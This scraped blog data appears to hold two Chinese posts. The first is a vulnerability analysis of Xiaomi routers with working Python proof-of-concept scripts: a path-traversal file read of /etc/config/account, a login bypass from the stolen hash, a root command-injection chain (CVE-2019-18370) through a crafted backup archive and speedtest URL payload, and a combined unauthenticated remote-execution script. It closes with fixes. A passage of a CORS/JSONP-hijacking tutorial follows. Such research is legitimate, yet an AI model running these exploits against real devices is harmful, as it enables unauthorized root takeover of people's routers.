//...&#125;; 可知oldPwd = sha1(nonce + sha1(pwd + &#39;a2ffa5c9be07488bbb04a3a47d3c5f6a&#39;))，登陆请求包为 POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=c9e62da7b8a0b7a4918c5a90912ba81a9717f9ab&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248 （2）验证用户登录的后端过程调用XQSecureUtil.checkUser函数 function checkUser(user, nonce, encStr) -- 从xiaoqiang 配置文件中读取信息 local password = XQPreference.get(user, nil, &quot;account&quot;) if password and not XQFunction.isStrNil(encStr) and not XQFunction.isStrNil(nonce) then if XQCryptoUtil.sha1(nonce..password) == encStr then return true end end XQLog.log(4, (luci.http.getenv(&quot;REMOTE_ADDR&quot;) or &quot;&quot;)..&quot; Authentication failed&quot;, nonce, password, encStr) return falseend 跟进XQPreference.get函数易知道是从/etc/config/account文件中读取某个字符串，这里称它为accountStr。 checkUser函数判断等式为(encStr为参数oldPwd) sha1(nonce + sha1(密码 + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;))==sha1(nonce + accountStr) 则 accountStr == sha1(密码 + &#x27;a2ffa5c9be07488bbb04a3a47d3c5f6a&#x27;) 故，只需要读取/etc/config/account得到accountStr即可构造如下数据包登陆 POST /cgi-bin/luci/api/xqsystem/login HTTP/1.1Host: 192.168.31.1username=admin&amp;password=sha1(nonce + account中保存的字符串)&amp;logtype=2&amp;nonce=0_mac地址_时间戳_5248 3、实现任意登录POCarbitrary_file_read_vulnerability.py import osimport reimport timeimport base64import randomimport hashlibimport requestsfrom Crypto.Cipher import AES# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;def get_mac(): ## get mac r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies) mac = re.findall(r&#x27;deviceId = \\&#x27;(.*?)\\&#x27;&#x27;, r0.text)[0] # print(mac) return macdef get_account_str(): ## read /etc/config/account r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies) print(r1.text) account_str = re.findall(r&#x27;admin\\&#x27;? \\&#x27;(.*)\\&#x27;&#x27;, r1.text)[0] return account_strdef create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0,10000) return &quot;%d_%s_%d_%d&quot;%(type_, deviceId, time_, rand)def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode(&#x27;utf-8&#x27;)) return m.hexdigest()mac = get_mac()account_str = get_account_str()## login, get stoknonce = create_nonce(mac)password = calc_password(nonce, account_str)data = &quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;.format(password=password,nonce=nonce)r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, data = data, headers=&#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;&#125;, proxies=proxies)# print(r2.text)stok = re.findall(r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;,r2.text)[0]print(&quot;stok=&quot;+stok) 可以获取到登录的stok。 二、远程命令执行漏洞（root权限）（CVE-2019-18370） 在审计lua代码过程中，发现备份文件是tar.gz格式的，上传后tar -zxf解压，所以构造备份文件，可以控制解压目录的文件内容，结合测试上传下载速度功能的sh脚本执行时读取测试url列表文件，并将url部分直接进行命令拼接执行。 备份文件解压导致/tmp/目录任意文件可控 在/usr/lib/lua/luci/controller/api/misystem.lua中，配置文件功能如下 function cUpload() local LuciFs = require(&quot;luci.fs&quot;) local XQBackup = require(&quot;xiaoqiang.module.XQBackup&quot;) local code = 0 local canupload = true local uploadFilepath = &quot;/tmp/cfgbackup.tar.gz&quot; local fileSize = tonumber(LuciHttp.getenv(&quot;CONTENT_LENGTH&quot;)) if fileSize &gt; 102400 then canupload = false end LuciHttp.setfilehandler( function(meta, chunk, eof) if canupload then if not fp then if meta and meta.name == &quot;image&quot; then fp = io.open(uploadFilepath, &quot;w&quot;) end end if chunk then fp:write(chunk) end if eof then fp:close() end else code = 1630 end end ) if LuciHttp.formvalue(&quot;image&quot;) and fp then code = 0 end local result = &#123;&#125; if code == 0 then local ext = XQBackup.extract(uploadFilepath) if ext == 0 then result[&quot;des&quot;] = XQBackup.getdes() else code = 1629 end end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) LuciFs.unlink(uploadFilepath) end result[&quot;code&quot;] = code LuciHttp.write_json(result)end 其中调用XQBackup.extract(uploadFilepath)进行解压 -- 0:succeed-- 1:file does not exist-- 2:no description file-- 3:no mbu filefunction extract(filepath) local fs = require(&quot;nixio.fs&quot;) local tarpath = filepath if not tarpath then tarpath = TARMBUFILE end if not fs.access(tarpath) then return 1 end os.execute(&quot;cd /tmp; tar -xzf &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) os.execute(&quot;rm &quot;..tarpath..&quot; &gt;/dev/null 2&gt;/dev/null&quot;) if not fs.access(DESFILE) then return 2 end if not fs.access(MBUFILE) then return 3 end return 0end 可知，/tmp目录下的任意文件可控 /usr/bin/upload_speedtest，/usr/bin/download_speedtest等会读取/tmp/speedtest_urls.xml并提取url直接进行命令拼接，且这几个脚本可以通过web接口调用 举例，查看/usr/bin/download_speedtest文件 #!/usr/bin/env lua-- ...local cfg = &#123;-- ... [&#x27;xmlfile&#x27;] = &quot;/usr/share/speedtest.xml&quot;, [&#x27;tmp_speedtest_xml&#x27;] = &quot;/tmp/speedtest_urls.xml&quot;,&#125;VERSION=&quot;__UNDEFINED__&quot;-- ...-- 测试网速使用的url文件为，若存在/tmp/speedtest_urls.xml则使用，否则用/usr/share/speedtest.xmllocal filename = &quot;&quot;filexml = io.open(cfg.tmp_speedtest_xml)if filexml then filexml:close() filename = cfg.tmp_speedtest_xmlelse filename = cfg.xmlfileendlocal pp = io.open(filename)local line = pp:read(&quot;*line&quot;)local size = 0local resources = &#123;&#125;local u = &quot;&quot;local pids = &#123;&#125;-- ...function wget_work(url) local _url = url pid = posix.fork() if pid &lt; 0 then print(&quot;fork error&quot;) return -1 elseif pid &gt; 0 then --print(string.format(&quot;child pid %d\\n&quot;, pid)) else -- 拼接命令，最终在这里执行 os.execute(&#x27;for i in $(seq &#x27;.. math.floor(cfg.nr/cfg.nc) ..&#x27;); do wget &#x27;.. url .. &quot; -q -O /dev/null; done&quot;) end return pidendwhile line do -- 从文件中提取url， 这里提取没有进行过滤 local _, _, url = string.find(line,&#x27;&lt;item url=&quot;(.*)&quot;/&gt;&#x27;) if url then table.insert(resources, url) end line = pp:read(&quot;*line&quot;)endpp:close()local urls = mrandom(1, table.getn(resources), cfg.nc)for k, v in ipairs(urls) do if VERSION == &quot;LESSMEM&quot; then local pid = wget_work_loop(resources[v]) else -- VERSION 为 __UNDEFINED__， url直接作为参数 local pid = wget_work(resources[v]) end if(pid == 0) then os.exit(0) elseif(pid == -1) then done() endend 调用的地方貌似有好几个，其中/usr/lib/lua/luci/controller/api/xqnetdetect.lua中 function netspeed() local XQPreference = require(&quot;xiaoqiang.XQPreference&quot;) local XQNSTUtil = require(&quot;xiaoqiang.module.XQNetworkSpeedTest&quot;) local code = 0 local result = &#123;&#125; local history = LuciHttp.formvalue(&quot;history&quot;) if history then result[&quot;bandwidth&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;download&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth)) result[&quot;bandwidth2&quot;] = tonumber(XQPreference.get(&quot;BANDWIDTH2&quot;, 0, &quot;xiaoqiang&quot;)) result[&quot;upload&quot;] = tonumber(string.format(&quot;%.2f&quot;, 128 * result.bandwidth2)) else os.execute(&quot;/etc/init.d/miqos stop&quot;) -- 这里调用了downloadSpeedTest local download = XQNSTUtil.downloadSpeedTest() if download then result[&quot;download&quot;] = download result[&quot;bandwidth&quot;] = tonumber(string.format(&quot;%.2f&quot;, 8 * download/1024)) XQPreference.set(&quot;BANDWIDTH&quot;, tostring(result.bandwidth), &quot;xiaoqiang&quot;) else code = 1588 end if code ~= 0 then result[&quot;msg&quot;] = XQErrorUtil.getErrorMessage(code) end os.execute(&quot;/etc/init.d/miqos start&quot;) end result[&quot;code&quot;] = code LuciHttp.write_json(result)endfunction downloadSpeedTest() local speedtest = &quot;/usr/bin/download_speedtest&quot; local speed -- 直接调用sh文件 for _, line in ipairs(LuciUtil.execl(speedtest)) do if not XQFunction.isStrNil(line) and line:match(&quot;^avg rx:&quot;) then speed = line:match(&quot;^avg rx:(%S+)&quot;) if speed then speed = tonumber(string.format(&quot;%.2f&quot;,speed/8)) end break end end return speedend 所以，我们只需要构造恶意的speedtest_urls.xml文件，构造备份文件，上传备份文件，然后调用网络测试相关的接口，即可以实现命令注入。 实现命令执行poc template.xml文件 &lt;?xml version=&quot;1.0&quot;?&gt;&lt;root&gt; &lt;class type=&quot;1&quot;&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;item url=&quot;http://dl.ijinshan.com/safe/speedtest/FDFD1EF75569104A8DB823E08D06C21C.dat&quot;/&gt; &lt;/class&gt; &lt;class type=&quot;2&quot;&gt; &lt;item url=&quot;http://192.168.31.1 -q -O /dev/null;&#123;command&#125;&gt;/tmp/1.txt; exit; wget http://192.168.31.1 &quot;/&gt; &lt;/class&gt; &lt;class type=&quot;3&quot;&gt; &lt;item uploadurl=&quot;http://www.taobao.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.so.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.qq.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.sohu.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.tudou.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.360doc.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.kankan.com/&quot;/&gt; &lt;item uploadurl=&quot;http://www.speedtest.cn/&quot;/&gt; &lt;/class&gt;&lt;/root&gt; remote_command_execution_vulnerability.py import osimport tarfileimport requests# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;## get stokstok = input(&quot;stok: &quot;)## make config filecommand = input(&quot;command: &quot;)speed_test_filename = &quot;speedtest_urls.xml&quot;with open(&quot;template.xml&quot;,&quot;rt&quot;) as f: template = f.read()data = template.format(command=command)# print(data)with open(&quot;speedtest_urls.xml&quot;,&#x27;wt&#x27;) as f: f.write(data)with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar: # tar.add(&quot;cfg_backup.des&quot;) # tar.add(&quot;cfg_backup.mbu&quot;) tar.add(&quot;speedtest_urls.xml&quot;)## upload config fileprint(&quot;start uploading config file ...&quot;)r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;.format(stok), files=&#123;&quot;image&quot;:open(&quot;payload.tar.gz&quot;,&#x27;rb&#x27;)&#125;, proxies=proxies)# print(r1.text)## exec download speed test, exec commandprint(&quot;start exec command...&quot;)r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)# print(r2.text)## read result filer3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)if r3.status_code == 200: print(&quot;success, vul&quot;) print(r3.text) 三、结合二者，无需登录远程命令执行import osimport reimport timeimport base64import randomimport hashlibimport requestsfrom Crypto.Cipher import AESimport tarfile# proxies = &#123;&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;&#125;proxies = &#123;&#125;def get_mac(): ## get mac r0 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/web&quot;, proxies=proxies) mac = re.findall(r&#x27;deviceId = \\&#x27;(.*?)\\&#x27;&#x27;, r0.text)[0] # print(mac) return macdef get_account_str(): ## read /etc/config/account r1 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../etc/config/account&quot;, proxies=proxies) print(r1.text) account_str = re.findall(r&#x27;admin\\&#x27;? \\&#x27;(.*)\\&#x27;&#x27;, r1.text)[0] return account_strdef create_nonce(mac): type_ = 0 deviceId = mac time_ = int(time.time()) rand = random.randint(0, 10000) return &quot;%d_%s_%d_%d&quot; % (type_, deviceId, time_, rand)def calc_password(nonce, account_str): m = hashlib.sha1() m.update((nonce + account_str).encode(&#x27;utf-8&#x27;)) return m.hexdigest()mac = get_mac()account_str = get_account_str()## login, get stoknonce = create_nonce(mac)password = calc_password(nonce, account_str)data = &quot;username=admin&amp;password=&#123;password&#125;&amp;logtype=2&amp;nonce=&#123;nonce&#125;&quot;.format(password=password, nonce=nonce)r2 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/api/xqsystem/login&quot;, data=data, headers=&#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;&#125;, proxies=proxies)# print(r2.text)stok = re.findall(r&#x27;&quot;token&quot;:&quot;(.*?)&quot;&#x27;, r2.text)[0]print(&quot;stok=&quot; + stok)## make config filecommand = input(&quot;command: &quot;)speed_test_filename = &quot;speedtest_urls.xml&quot;with open(&quot;template.xml&quot;, &quot;rt&quot;) as f: template = f.read()data = template.format(command=command)# print(data)with open(&quot;speedtest_urls.xml&quot;, &#x27;wt&#x27;) as f: f.write(data)with tarfile.open(&quot;payload.tar.gz&quot;, &quot;w:gz&quot;) as tar: # tar.add(&quot;cfg_backup.des&quot;) # tar.add(&quot;cfg_backup.mbu&quot;) tar.add(&quot;speedtest_urls.xml&quot;)## upload config fileprint(&quot;start uploading config file ...&quot;)r1 = requests.post(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/misystem/c_upload&quot;.format(stok), files=&#123;&quot;image&quot;: open(&quot;payload.tar.gz&quot;, &#x27;rb&#x27;)&#125;, proxies=proxies)# print(r1.text)## exec download speed test, exec commandprint(&quot;start exec command...&quot;)r2 = requests.get(&quot;http://192.168.31.1/cgi-bin/luci/;stok=&#123;&#125;/api/xqnetdetect/netspeed&quot;.format(stok), proxies=proxies)# print(r2.text)## read result filer3 = requests.get(&quot;http://192.168.31.1/api-third-party/download/extdisks../tmp/1.txt&quot;, proxies=proxies)if r3.status_code == 200: print(&quot;success, vul&quot;) print(r3.text) 经测试，在小米系列路由器中存在该漏洞，如小米路由器R3G、小米路由器R3A、小米路由器R4等 四、修复方案1、任意文件读取将/etc/sysapihttpd/sysapihttpd.conf中的形如以下形式修改为 location /xxx &#123; alias /abc/;&#125; 修改为 location /xxx/ &#123; alias /abc/;&#125; 2、远程命令执行 将备份文件格式修改为特定格式，直接读取备份文件内容，而不需使用解压 从speedtest_urls.xml中读取urls时，进行必要的过滤，防止命令注入","categories":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"https://wolke.cn/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://wolke.cn/tags/CVE/"},{"name":"路由器","slug":"路由器","permalink":"https://wolke.cn/tags/%E8%B7%AF%E7%94%B1%E5%99%A8/"}],"author":"w01ke"},{"title":"CORS跨域漏洞与JSONP劫持","slug":"CORS跨域漏洞与JSONP劫持","date":"2022-03-10T03:43:27.000Z","updated":"2022-04-19T04:58:37.875Z","comments":true,"path":"post/c8aa67d0.html","link":"","permalink":"https://wolke.cn/post/c8aa67d0.html","excerpt":"","text":"前几天逛B站刷到个视频，UP主利用酷某音乐软件存在JSONP劫持漏洞获取了骗子绑定的手机号，于是我便搜集了些网上的资料对JSONP的相关知识点进行一个系统的学习，原视频如下 (function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer0\"),\"theme\":\"#da4e7f\",\"screenshot\":true,\"video\":{\"url\":\"/video/Av637198900.mp4\",\"pic\":\"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.png\"},\"danmaku\":{\"api\":\"https://dplayer.alone88.cn/v3/bilibili?cid=554223473\",\"token\":\"tokendemo\",\"addition\":[\"https://dplayer.alone88.cn/v3/bilibili?cid=554223473\"]}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 一、前言CORS全称为Cross-Origin Resource Sharing，即跨域资源共享，用于绕过SOP（同源策略）来实现跨域资源访问的一种技术。而CORS漏洞则是利用CORS技术窃取用户敏感数据。CORS需要浏览器和服务器同时支持。目前，所有浏览器都支持该功能，IE浏览器不能低于IE10。 整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。 因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。 JSONP全称是Json With Padding，是基于JSON格式的为解决跨域请求而产生的解决实现方案。JSONP实现的基本原理是利用了HTML里&lt;script&gt;&lt;/scirpt&gt;元素标签，远程调用JSON文件来实现数据传递。当某网站通过JSONP的方式来跨域（一般为子域）传递用户认证后的敏感信息时，攻击者可以构造恶意的JSONP调用页面，诱导被攻击者访问来达到截取用户敏感信息的目的。 CORS漏洞、JSONP劫持实际上都属于CSRF跨站请求伪造漏洞，尽管二者已经出现了很多年，但由于部分厂商对此不够重视导致其仍在不断发展和扩散。 1、同源策略对 CORS 的介绍要从浏览器的同源策略开始说起，SOP 全称为 Same Origin Policy，即同源策略。该策略是浏览器的一个安全基石，同源策略规定：不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源。 简单来说同源策略就是浏览器会阻止一个源与另一个源的资源交互。可以试想一下，如果没有同源策略，当你访问一个正常网站的时候又无意间打开了另一个恶意网站，恶意网站会从你刚刚访问的正常网站上窃取你全部的信息。所谓同源是指 域名，协议，端口相同。 2、AJAX技术跨域问题是针对使用 XMLHttpRequest 技术构建的复杂的、动态的网页的编程实践技术—— AJAX 的，HTML 本身没有跨域问题。 ​ AJAX 全称 Asynchronous JavaScript + XML，即异步 JavaScript 和 XML。AJAX 本身不是一种新技术，而是用来描述一种使用现有技术集合/标准的新方法，包括：HTML or XHTML、Cascading Style Sheets、JavaScript、The Document Object Model、XML、XSLT 以及 XMLHttpRequest object。AJAX 允许只更新一个 HTML 页面的部分 DOM，而无须重新加载整个页面， 网页应用能够快速地将增量更新呈现在用户界面上，而不需要重新加载整个页面。这使得程序能够更快地回应用户的操作。 【注意】尽管X在 Ajax 中代表 XML，但由于 JSON 的许多优势，比如更加轻量以及作为 Javascript 的一部分，目前 JSON 的使用比 XML 更加普遍。JSON 和 XML 都被用于在 Ajax 模型中打包信息。 当我们使用 AJAX 技术发送 XMLHttpRequest 请求的时候，如果请求的是别的域 (主机域名、端口) 不同时，那么就会产生跨域问题(受同源策略影响，客户端将无法获取服务端返回的数据，除非使用 CORS 跨域资源共享技术)。值得注意的是：跨域的问题是发生在XMLHttpRequest 请求的，也就是说，不是 XMLHttpRequest 请求是不会有跨域问题的。举个很简单的例子：在编写网页的时候，&lt;img src = www.xxxx.xxxx/ &gt;，在 CORS 跨域资源共享技术的作用下，URL 不是本域的还是可以正常获取该图片的。 二、CORS跨域SOP 浏览器同源策略是一个很好的策略，在 SOP 被提出之后，大家都默默地遵守着这个规定，但随着WEB应用的发展，有些网站由于自身业务的需求，需要实现一些跨域的功能能够让不同域的页面之间能够相互访问各自页面的内容。常见需要跨域的业务场景如下： 比如后端开发完一部分业务代码后，提供接口给前端用，在前后端分离的模式下，前后端的域名是不一致的，此时就会发生跨域访问的问题； 程序员在本地做开发，本地的文件夹并不是在一个域下面，当一个文件需要发送 ajax 请求，请求另外一个页面的内容的时候，就会跨域； 电商网站想通过用户浏览器加载第三方快递网站的物流信息； 子站域名希望调用主站域名的用户资料接口，并将数据显示出来。 为了实现这个跨域需求，聪明的程序员想到了一种编码技术 JSONP，该技术利用从客户端传入的 json 格式的返回值，在服务器端调用该接口处事先以定义函数的方式定义好 json 格式里参数值，并加载 script 标签调用该函数实现跨域。 JSONP 虽然好，但它并非是在协议层面解决跨域问题，所以出现了很多安全问题。 ​ 为了能更安全的进行跨域资源访问，CORS 诞生了。CORS 是 H5 提供的一种机制，WEB 应用程序可以通过在 HTTP 报文中增加特定字段来告诉浏览器，哪些不同来源的服务器是有权访问本站资源。 1、跨域流程浏览器将CORS请求分成两类：简单请求（simple request）和 非简单请求（not-so-simple request）。只要同时满足以下两个条件就属于简单请求否则属于非简单请求（主要通过请求方法进行判断）： 请求方法是以下三种之一 HEAD GET POST HTTP的头信息不超出以下几种字段。 Accept Accept-Language Content-Language Lat-Event-ID Content-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain。这是为了兼容表单（form），因为历史上表单一直可以发出跨域请求。AJAX 的跨域设计就是，只要表单可以发，AJAX 就可以直接发。 （1）CORS跨域——简单请求的流程对于简单请求，大致流程是浏览器发现这一次向服务器提交的请求是简单请求，所以自动在头信息中增加了一个Origin的字段，用来表示这次的请求来自哪个域。 GET /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。 如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。 如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。 Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Credentials: trueAccess-Control-Expose-Headers: FooBarContent-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。 Access-Control-Allow-Origin：该字段是必须存在的，它的值可能是 Origin 字段的值或者是一个通配符“*”，表示可以接受任意域名的请求，当然大部分服务器如果配置了通配符的话，信息泄露的风险骤然加大； Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。但需要注意的是，如果要发送 cookie，Access-Control-Allow-Origin 就不能设为星号，必须明确指定与请求网页一致的域名，同时Cookie依然遵循同源策略， 只有用服务器域名设置的Cookie才会上传，其他域名的Cookie并不会上传，且（跨源）原网页代码中的document.cookie也无法读取服务器域名下的Cookie。 Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&#39;FooBar&#39;)可以返回FooBar字段的值。 具体的CORS简单跨域请求流程如下 withCredentials 属性上面说到，CORS请求默认不发送Cookie和HTTP认证信息。如果要把Cookie发到服务器，一方面要服务器同意，指定Access-Control-Allow-Credentials字段。 Access-Control-Allow-Credentials: true 另一方面，开发者必须在AJAX请求中打开withCredentials属性 var xhr = new XMLHttpRequest();xhr.withCredentials = true; 否则，即使服务器同意发送Cookie，浏览器也不会发送。或者，服务器要求设置Cookie，浏览器也不会处理。 但是，如果省略withCredentials设置，有的浏览器还是会一起发送Cookie。这时，可以显式关闭withCredentials。 xhr.withCredentials = false; （2）CORS跨域——非简单请求的流程所谓非简单请求就是那种对服务器提出特殊要求的请求，例如请求方法为 PUT 或 DELETE。非简单的 CORS 请求会在正式通信之前，增加一次 HTTP 查询请求，称之为 “预检请求”（preflight） 。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单里以及可以使用哪些 HTTP 动词和头信息字段。只有获得了肯定响应，浏览器才会正式发出 XMLHttpRequest 请求，否则就报错。这种请求的好处是对传统的没有 CORS 支持的服务器减小压力，给服务器一个提前拒绝的机会。 ① 预检请求下面是一段浏览器的JavaScript脚本。 var url = &#x27;http://api.alice.com/cors&#x27;;var xhr = new XMLHttpRequest();xhr.open(&#x27;PUT&#x27;, url, true);xhr.setRequestHeader(&#x27;X-Custom-Header&#x27;, &#x27;value&#x27;);xhr.send(); 上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。 OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 （1）Access-Control-Request-Method 该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 （2）Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 ② 预检请求的回应服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 如果服务器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他CORS相关字段如下。 Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods 该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 （2）Access-Control-Allow-Headers 如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。 （3）Access-Control-Allow-Credentials 该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age 该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 ③ 浏览器的正常请求和回应一旦服务器通过了”预检”请求，以后每次浏览器正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 下面是”预检”请求之后，浏览器的正常CORS请求。 PUT /cors HTTP/1.1Origin: http://api.bob.comHost: api.alice.comX-Custom-Header: valueAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... 上面头信息的Origin字段是浏览器自动添加的。 下面是服务器正常的回应。 